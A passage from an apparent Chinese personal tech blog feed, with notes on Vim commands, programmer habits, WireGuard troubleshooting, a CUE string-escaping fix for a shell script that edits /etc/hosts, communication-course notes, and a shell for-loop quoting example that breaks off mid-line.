title="2021.03.17(三)"></a>2021.03.17(三)</h1><h2 id="使用-hjkl-移动光标"><a href="#使用-hjkl-移动光标" class="headerlink" title="使用 hjkl 移动光标"></a>使用 hjkl 移动光标</h2><p>hjkl   左下上右</p><h2 id="Undo-x2F-Redo"><a href="#Undo-x2F-Redo" class="headerlink" title="Undo&#x2F;Redo"></a>Undo&#x2F;Redo</h2><p>u → undo<br>Ctrl+r → redo</p><h2 id="打开-x2F-保存-x2F-退出-x2F-改变文件-Buffer"><a href="#打开-x2F-保存-x2F-退出-x2F-改变文件-Buffer" class="headerlink" title="打开&#x2F;保存&#x2F;退出&#x2F;改变文件(Buffer)"></a>打开&#x2F;保存&#x2F;退出&#x2F;改变文件(Buffer)</h2><p>:e &lt;path&#x2F;to&#x2F;file&gt; → 打开一个文件<br>:saveas &lt;path&#x2F;to&#x2F;file&gt; → 另存为 &lt;path&#x2F;to&#x2F;file&gt;<br>:bn 和 :bp → 你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。</p><p>:w → 存盘<br>:wq → 存盘 + 退出 (:w 存盘, :q 退出)<br>:q! → 退出不保存<br>:qa! 强行退出所有的正在编辑的文件，就算别的文件有更改。</p><h1 id="2021-03-18-四"><a href="#2021-03-18-四" class="headerlink" title="2021.03.18(四)"></a>2021.03.18(四)</h1><p>更好，更强，更快<br>先恭喜你！你干的很不错。我们可以开始一些更为有趣的事了。在第三级，我们只谈那些和vi可以兼容的命令。</p><h2 id="vim是怎么重复自己的"><a href="#vim是怎么重复自己的" class="headerlink" title="vim是怎么重复自己的"></a>vim是怎么重复自己的</h2><p>下面，让我们看一下vim是怎么重复自己的：</p><p>. → (小数点) 可以重复上一次的命令<br>N<command> → 重复某个命令N次</p><blockquote><p>下面是一个示例，找开一个文件你可以试试下面的命令：<br>2dd → 删除2行<br>3p → 粘贴文本3次<br>100idesu [ESC] → 会写下 “desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu “<br>. → 重复上一个命令—— 100 “desu “.<br>3. → 重复 3 次 “desu” (注意：不是 300，你看，VIM多聪明啊).</p></blockquote><h2 id="光标移动更有效率"><a href="#光标移动更有效率" class="headerlink" title="光标移动更有效率"></a>光标移动更有效率</h2><p>NG → 到第 N 行 （注意命令中的G是大写的，另我一般使用 : N 到第N行，如 :137 到第137行）<br>gg → 到第一行（相当于1G，或 :1）<br>G → 到最后一行</p><p>按单词移动：</p><ul><li>w → 到下一个单词的开头。</li><li>e → 到下一个单词的结尾。<blockquote><p>如果你认为单词是由默认方式，那么就用小写的e和w。默认上来说，一个单词由字母，数字和下划线组成（注：程序变量）<br>如果你认为单词是由blank字符分隔符，那么你需要使用大写的E和W。（注：程序语句）</p></blockquote></li></ul><p>最强的光标移动：</p><ul><li>% : 匹配括号移动，包括 (, {, [. （注：你需要把光标先移到括号上）</li><li>* 和 #:  匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个）</li></ul><h1 id="2021-03-22-一"><a href="#2021-03-22-一" class="headerlink" title="2021.03.22(一)"></a>2021.03.22(一)</h1><h2 id="和移动光标命令连动的命令"><a href="#和移动光标命令连动的命令" class="headerlink" title="和移动光标命令连动的命令"></a>和移动光标命令连动的命令</h2><p>&lt;start position&gt;&lt;command&gt;&lt;end position&gt;</p><blockquote><p>例如 0y$ 命令意味着：0 → 先到行头  y → 从这里开始拷贝  $ → 拷贝到本行最后一个字符 你可可以输入<br>ye，从当前位置拷贝到本单词的最后一个字符。<br>你也可以输入 y2&#x2F;foo 来拷贝2个 “foo” 之间的字符串。</p></blockquote><p>&lt;command&gt;有：</p><blockquote><p>y（拷贝）<br>d (删除 )<br>v (可视化的选择)<br>gU (变大写)<br>gu (变小写)</p></blockquote><p>（注：可视化选择是一个很有意思的命令，你可以先按v，然后移动光标，你就会看到文本被选择，然后，你可能d，也可y，也可以变大写等）</p><h2 id="在当前行上移动光标-0-f-F-t-T"><a href="#在当前行上移动光标-0-f-F-t-T" class="headerlink" title="在当前行上移动光标: 0 ^ $ f F t T ,"></a>在当前行上移动光标: 0 ^ $ f F t T ,</h2><blockquote><p>0 → 到行头<br>^ → 到本行的第一个非blank字符<br>$ → 到行尾<br>g_ → 到本行最后一个不是blank字符的位置。<br>fa → 到下一个为a的字符处，你也可以fs到下一个为s的字符。<br>t, → 到逗号前的第一个字符。逗号可以变成其它字符。<br>3fa → 在当前行查找第三个出现的a。<br>F 和 T → 和 f 和 t 一样，只不过是相反方向。</p></blockquote><p>还有一个很有用的命令是 dt” → 删除所有的内容，直到遇到双引号—— “。</p><h2 id="区域选择"><a href="#区域选择" class="headerlink" title="区域选择"></a>区域选择</h2><p>在visual 模式下，这些命令很强大，其命令格式为：&lt;action&gt;a&lt;object&gt; 和 &lt;action&gt;i&lt;object&gt;</p><p>action可以是任何的命令，如 d (删除), y (拷贝), v (可以视模式选择)。</p><p>object为文本对象：Vim把文本对象分为了两类 ，一类是块文本对象，另一类是非块文本对象。</p><p><a href="https://blog.csdn.net/zwlove5280/article/details/108264265">Vim文本对象参考</a></p><h3 id="非块文本对象"><a href="#非块文本对象" class="headerlink" title="非块文本对象"></a>非块文本对象</h3><table><thead><tr><th align="left">非块文本对象</th><th align="left">说明</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">aw</td><td align="left">当前单词及单词前面或者后面的空格</td><td align="left">w表示word(单词)<br>aw是包含一个空格的，如果单词后面有空格，那么aw包含的就是后面的空格，否则包含的是前面的空格。</td></tr><tr><td align="left">iw</td><td align="left">当前单词</td><td align="left">iw是不包含空格的</td></tr><tr><td align="left">aW</td><td align="left">当前字串及字串前面或者后面的空格</td><td align="left">W表示WORD(字串)</td></tr><tr><td align="left">iW</td><td align="left">当前字串</td><td align="left"></td></tr><tr><td align="left">as</td><td align="left">当前句子及句子前面或后面的空格</td><td align="left">s表示sentence(句子)</td></tr><tr><td align="left">is</td><td align="left">当前句子</td><td align="left"></td></tr><tr><td align="left">ap</td><td align="left">当前段落及段落前面或后面的空行</td><td align="left">p表示paragraph(段落)</td></tr><tr><td align="left">ip</td><td align="left">当前段落</td><td align="left"></td></tr><tr><td align="left">文本对象都是以a或者i开头，它们的区别在于是否包含空格或者空行。</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><font color=red>辅助记忆：我们可以把a理解为around，把i理解为inner。</font></td><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="块文本对象"><a href="#块文本对象" class="headerlink" title="块文本对象"></a>块文本对象</h3><p>块文本对象应该就是被成对的符号分隔的文本对象。</p><p>例如”Hello World!”，就是一个块文本对象，文本被一对双引号包含，同理&lt;h1&gt;标题&lt;&#x2F;h1&gt;也就一个块文本对象，它被一对标签所包围。</p><p>成对的分隔符包括 小、中、大括号，双引号，单引号，反引号，以及HTML中的标签。</p><p><font color=red>如果块文本对象命令以a开头，那么包括成对的分隔符，如果以i开头，则不包含。</font></p><h3 id="删除一个单词"><a href="#删除一个单词" class="headerlink" title="删除一个单词"></a>删除一个单词</h3><p>删除一个单词，我们可能把光标移动到单词的开头，然后使用dw删除。这要求光标必须先移动到单词的开头。</p><p>如果使用daw删除一个单词呢，只要光标在单词上任意位置或者在单词前面的空格上，就能使用daw删除一个单词。</p><h3 id="区域选择示例"><a href="#区域选择示例" class="headerlink" title="区域选择示例"></a>区域选择示例</h3><blockquote><p>举例：假设你有一个字符串 (map (+) (“foo”)).而光标键在第一个 o 的位置。<br>vi” → 会选择 foo.<br>va” → 会选择 “foo”.<br>vi) → 会选择 “foo”.<br>va) → 会选择(“foo”).<br>v2i) → 会选择 map (+) (“foo”)<br>v2a) → 会选择 (map (+) (“foo”))</p></blockquote><h2 id="块操作"><a href="#块操作" class="headerlink" title="块操作: "></a>块操作: <C-v></h2><p>块操作，典型的操作： 0 &lt;C-v&gt; &lt;C-d&gt; I– [ESC]</p><blockquote><p>^ → 到行头<br><C-v> → 开始块操作<br><C-d> → 向下移动 (你也可以使用hjkl来移动光标，或是使用%，或是别的)<br>I– [ESC] → I是插入，插入“–”，按ESC键来为每一行生效。</p></blockquote><p>在Windows下的vim，你需要使用 <C-q> 而不是 <C-v> ，<C-v> 是拷贝剪贴板。</p><h2 id="自动提示：-lt-C-n-gt-和-lt-C-p-gt"><a href="#自动提示：-lt-C-n-gt-和-lt-C-p-gt" class="headerlink" title="自动提示：&lt;C-n&gt; 和 &lt;C-p&gt;"></a>自动提示：&lt;C-n&gt; 和 &lt;C-p&gt;</h2><p>在 Insert 模式下，你可以输入一个词的开头，然后按 &lt;C-p&gt;或是&lt;C-n&gt;，自动补齐功能就出现了……</p><h2 id="宏录制：-qa-操作序列-q-a"><a href="#宏录制：-qa-操作序列-q-a" class="headerlink" title="宏录制： qa 操作序列 q, @a, @@"></a>宏录制： qa 操作序列 q, @a, @@</h2><p>qa 把你的操作记录在寄存器 a。<br>于是 @a 会replay被录制的宏。<br>@@ 是一个快捷键用来replay最新录制的宏。</p><blockquote><p>示例<br>在一个只有一行且这一行只有“1”的文本中，键入如下命令：<br>qaYp&lt;C-a&gt;q→<br>qa 开始录制<br>Yp 复制行.<br>&lt;C-a&gt; 增加1.<br>q 停止录制.<br>@a → 在1下面写下 2<br>@@ → 在2 正面写下3<br>现在做 100@@ 会创建新的100行，并把数据增加到 103.</p></blockquote><h2 id="可视化选择：-v-V-lt-C-v-gt"><a href="#可视化选择：-v-V-lt-C-v-gt" class="headerlink" title="可视化选择： v,V,&lt;C-v&gt;"></a>可视化选择： v,V,&lt;C-v&gt;</h2><p>前面，我们看到了 &lt;C-v&gt;的示例 （在Windows下应该是&lt;C-q&gt;），我们可以使用 v 和 V。</p><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">v</td><td align="left">字符选择，将光标经过的字符选择</td></tr><tr><td align="left">V</td><td align="left">行选择，将光标经过的行选择</td></tr><tr><td align="left">[Ctrl]+v</td><td align="left">矩形选择，可以用矩形的方式选择数据</td></tr></tbody></table><p>一但被选好了，你可以做下面的事：</p><p>J → 把所有的行连接起来（变成一行）<br>&lt; 或 &gt; → 左右缩进<br>&#x3D; → 自动给缩进 （注：这个功能相当强大，我太喜欢了）</p><blockquote><p>示例：在所有被选择的行后加上点东西：<br>&lt;C-v&gt;<br>选中相关的行 (可使用 j 或 &lt;C-d&gt; 或是 &#x2F;pattern 或是 % 等……)<br>$ 到行最后<br>A, 输入字符串，按 ESC。</p></blockquote><h2 id="分屏-split-和-vsplit"><a href="#分屏-split-和-vsplit" class="headerlink" title="分屏: :split 和 vsplit."></a>分屏: :split 和 vsplit.</h2><p>下面是主要的命令，你可以使用VIM的帮助 :help split. 你可以参考 <a href="https://coolshell.cn/articles/1679.html">VIM分屏</a>。</p><blockquote><p>:split → 创建分屏 (:vsplit创建垂直分屏)<br>&lt;C-w&gt;&lt;dir&gt; : dir就是方向，可以是 hjkl 或是 ←↓↑→ 中的一个，其用来切换分屏。<br>&lt;C-w&gt;_ (或 &lt;C-w&gt;|) : 最大化尺寸 (<C-w>| 垂直分屏)<br>&lt;C-w&gt;+ (或&lt;C-w&gt;-) : 增加尺寸</p></blockquote><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>其中关于vim的一些可视化的例子在下面的参考学习链接里</p><p><a href="https://www.cnblogs.com/hxf-changmylife/p/5918052.html">参考学习链接</a><br><a href="https://blog.csdn.net/niushuai666/article/details/7275406">参考学习链接</a></p><p>vim学习到此结束，一定要多加练习呀！</p><h1 id="2021-03-30补充"><a href="#2021-03-30补充" class="headerlink" title="2021.03.30补充"></a>2021.03.30补充</h1><h2 id="显示空白字符"><a href="#显示空白字符" class="headerlink" title="显示空白字符"></a>显示空白字符</h2><p>进入 vim 后，在普通模式下按冒号(:)，会在最下一行出现冒号，并可以开始打字。输入：</p><blockquote><p>:set list</p></blockquote><p>后回车，就可以了。<font color=red>list 打开后，行尾、制表符等空白字符都会用特殊符号显示出来。</font><br>如果想关闭，就输入：</p><blockquote><p>:set nolist</p></blockquote><h1 id="2023-08-09-三"><a href="#2023-08-09-三" class="headerlink" title="2023.08.09(三)"></a>2023.08.09(三)</h1><h2 id="各种删除"><a href="#各种删除" class="headerlink" title="各种删除"></a>各种删除</h2><p>普通模式（命令行模式）（按了ESC）下：<br>dd → 删除当前行，并把删除的行存到剪贴板里 (辅助记忆：delete)<br>2dd  → 删除从当前行开始的接下来两行<br>输入:3,5d，按Enter键 → 要删除从3到5的行<br>输入:.,$d  →  删除从当前行到文件末尾<br>输入:.,1d  →  删除从当前行到文件开头<br>输入:%d，按enter键 → 删除所有行</p><p>.（点）  →  当前行<br>$   →  最后一行<br>%  →  所有行</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>优秀程序员的共性特征-review</title>
    <link href="/2024/01/02/code/%E4%BC%98%E7%A7%80%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%85%B1%E6%80%A7%E7%89%B9%E5%BE%81-review/"/>
    <url>/2024/01/02/code/%E4%BC%98%E7%A7%80%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%85%B1%E6%80%A7%E7%89%B9%E5%BE%81-review/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.toutiao.com/article/7315361744254861874/?app=news_article&timestamp=1703474209&use_new_style=1&req_id=20231225111648F919B5981AB74F493147&group_id=7315361744254861874&wxshare_count=1&tt_from=weixin&utm_source=weixin&utm_medium=toutiao_android&utm_campaign=client_share&share_token=05f0881f-b2b2-4fc4-98f4-41c189c55d13&source=m_redirect&wid=1704176093219">腾讯工作13年之所思所想，那些优秀程序员的共性特征-今日头条 (toutiao.com)</a></p><p><strong>偏执</strong><br>对于一个方案，一个实现，请不要说出“好像这样也可以”。你一定要选出一个更好的做法，并且一直坚持这个做法，并且要求别人也这样做。</p><p><strong>控制软件的熵</strong></p><p><strong>为测试做设计</strong><br>以及，如果没有强大的外部驱动力，“以后再测”实际上意味着“永远不测”。大家务实一点，在编码时就考虑怎么测试。不然，你永远没有机会考虑了。当面对着测试性低的代码，需要编写自动化测试的时候，你会感觉很难受。</p><p><strong>尽早测试, 经常测试, 自动测试</strong></p><p>一旦代码写出来，就要尽早开始测试。这些小鱼的恶心之处在于，它们很快就会变成巨大的食人鲨，而捕捉鲨鱼则相当困难。所以我们要写单元测试，写很多单元测试。</p><p><strong>项目中使用统一的术语</strong></p><p><strong>不要面向需求编程</strong></p><p><strong>写代码要有对于“美”的追求</strong></p><p><strong>应用程序框架是实现细节</strong></p>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wireguard</title>
    <link href="/2023/12/13/net/wireguard/"/>
    <url>/2023/12/13/net/wireguard/</url>
    
    <content type="html"><![CDATA[<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nerdctl ps<br>nerdctl logs containerID/<span class="hljs-type">NAME</span><br>nerdctl <span class="hljs-keyword">restart</span> containerID/<span class="hljs-type">NAME</span><br><br>ip a <span class="hljs-keyword">show</span> wg0<br><br>nc -vz -w3 <span class="hljs-number">240.2</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue语言系列】(202403) unknown escape sequence</title>
    <link href="/2023/11/16/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20unknown%20escape%20sequence/"/>
    <url>/2023/11/16/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20unknown%20escape%20sequence/</url>
    
    <content type="html"><![CDATA[<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-literal">unknown</span> <span class="hljs-keyword">escape</span> sequence:<br>    <span class="hljs-operator">-</span>:<span class="hljs-number">16</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">global: &#123;<br>    <span class="hljs-built_in">test</span>: <span class="hljs-string">&quot;111&quot;</span><br>&#125;<br><br>data: <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">\(global.test)</span><br><span class="hljs-string">#!/bin/sh</span><br><span class="hljs-string">echo -e &quot;</span>\n 追加镜像仓库映射到/etc/hosts文件 <span class="hljs-string">&quot;</span><br><span class="hljs-string"># 要检查并追加的IP和主机名  </span><br><span class="hljs-string">IP=&quot;</span>1.1.1.1<span class="hljs-string">&quot;  </span><br><span class="hljs-string">HOSTNAME=&quot;</span>abc<span class="hljs-string">&quot;  </span><br><span class="hljs-string"># 要搜索的字符串  </span><br><span class="hljs-string">search_string=&quot;</span><span class="hljs-variable">$IP</span> <span class="hljs-variable">$HOSTNAME</span><span class="hljs-string">&quot;  </span><br><span class="hljs-string"></span><br><span class="hljs-string"># 使用grep检查字符串是否存在，并且没有被注释掉  </span><br><span class="hljs-string">if ! grep -E &quot;</span>^[^<span class="hljs-comment">#]\s*$search_string&quot; /etc/hosts; then  </span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span>&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts &gt; /dev/null  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已添加 <span class="hljs-variable">$search_string</span> 到 /etc/hosts&quot;</span>  <br><span class="hljs-keyword">else</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span> 已在 /etc/hosts 中找到，无需添加&quot;</span>  <br><span class="hljs-keyword">fi</span><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240320184104.png" alt="image.png"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">global: &#123;<br>    <span class="hljs-built_in">test</span>: <span class="hljs-string">&quot;111&quot;</span><br>&#125;<br><br>data: <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">\(global.test)</span><br><span class="hljs-string">#!/bin/sh</span><br><span class="hljs-string">echo -e &quot;</span>\n 追加镜像仓库映射到/etc/hosts文件 <span class="hljs-string">&quot;</span><br><span class="hljs-string"># 要检查并追加的IP和主机名  </span><br><span class="hljs-string">IP=&quot;</span>1.1.1.1<span class="hljs-string">&quot;  </span><br><span class="hljs-string">HOSTNAME=&quot;</span>abc<span class="hljs-string">&quot;  </span><br><span class="hljs-string"># 要搜索的字符串  </span><br><span class="hljs-string">search_string=&quot;</span><span class="hljs-variable">$IP</span> <span class="hljs-variable">$HOSTNAME</span><span class="hljs-string">&quot;  </span><br><span class="hljs-string"></span><br><span class="hljs-string"># 使用grep检查字符串是否存在，并且没有被注释掉  </span><br><span class="hljs-string">if ! grep -E &quot;</span>^[^<span class="hljs-comment">#]\\s*$search_string&quot; /etc/hosts; then  </span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span>&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts &gt; /dev/null  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已添加 <span class="hljs-variable">$search_string</span> 到 /etc/hosts&quot;</span>  <br><span class="hljs-keyword">else</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span> 已在 /etc/hosts 中找到，无需添加&quot;</span>  <br><span class="hljs-keyword">fi</span><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">data2: #&quot;</span><span class="hljs-string">&quot;&quot;</span><br>\(global.test)<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n 追加镜像仓库映射到/etc/hosts文件 &quot;</span><br><span class="hljs-comment"># 要检查并追加的IP和主机名  </span><br>IP=<span class="hljs-string">&quot;1.1.1.1&quot;</span>  <br>HOSTNAME=<span class="hljs-string">&quot;abc&quot;</span>  <br><span class="hljs-comment"># 要搜索的字符串  </span><br>search_string=<span class="hljs-string">&quot;<span class="hljs-variable">$IP</span> <span class="hljs-variable">$HOSTNAME</span>&quot;</span>  <br><br><span class="hljs-comment"># 使用grep检查字符串是否存在，并且没有被注释掉  </span><br><span class="hljs-keyword">if</span> ! grep -E <span class="hljs-string">&quot;^[^#]\s*<span class="hljs-variable">$search_string</span>&quot;</span> /etc/hosts; <span class="hljs-keyword">then</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span>&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts &gt; /dev/null  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已添加 <span class="hljs-variable">$search_string</span> 到 /etc/hosts&quot;</span>  <br><span class="hljs-keyword">else</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span> 已在 /etc/hosts 中找到，无需添加&quot;</span>  <br><span class="hljs-keyword">fi</span><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240320183912.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>沟通课程笔记</title>
    <link href="/2023/11/09/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/11/09/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>前期要想明白怎么做这件事情<br>做完汇报，最后要给出一个下一步行动，这个很重要</p><p>支点框架</p><ul><li>清醒 坚定 努力</li><li>白色 红色 黑色</li><li>小草 竹子 …</li><li>前端的html css js<br>三种动物 三种植物 三种饮料 …</li></ul><h2 id="钟摆框架-太冷-太热-刚刚好"><a href="#钟摆框架-太冷-太热-刚刚好" class="headerlink" title="钟摆框架- 太冷 太热 刚刚好"></a>钟摆框架<br>- 太冷 太热 刚刚好</h2><p>TODO: 想自己合适的自我介绍</p><p>在很久很久以前，有一个吸血魔头，他天生嗜血成性，经常装扮成一个帅气多金的男孩子，</p>]]></content>
    
    
    <categories>
      
      <category>沟通课程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【shell】(20231101) for循环遍历时加不加引号的区别</title>
    <link href="/2023/11/01/shell/%E3%80%90shell%E3%80%91(20231101)%20for%E5%BE%AA%E7%8E%AF%E9%81%8D%E5%8E%86%E6%97%B6%E5%8A%A0%E4%B8%8D%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2023/11/01/shell/%E3%80%90shell%E3%80%91(20231101)%20for%E5%BE%AA%E7%8E%AF%E9%81%8D%E5%8E%86%E6%97%B6%E5%8A%A0%E4%B8%8D%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 脚本</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span><br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## 执行</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span><br><span class="hljs-keyword">done</span><br>anaconda-ks.cfg<br>12<br>34<br>anaconda-ks.cfg<br>56<br>78<br><br><br><br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 脚本</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## 执行</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span 